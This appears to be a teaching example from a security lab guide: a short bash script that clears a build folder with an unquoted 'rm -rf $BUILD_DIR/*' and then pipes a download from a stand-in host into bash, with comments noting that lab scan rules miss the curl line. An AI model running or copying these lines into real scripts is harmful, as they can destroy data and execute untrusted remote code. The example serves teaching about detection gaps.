#!/bin/bash
# Tidy a build folder. The rm line is one the lab's rules look
# for. The curl line is just as dangerous and no lab rule looks
# for it: it sails through every scan in this guide, which is
# a lesson in itself (chapter 13).

BUILD_DIR=$1

rm -rf $BUILD_DIR/*

curl -s https://example.invalid/install.sh | bash
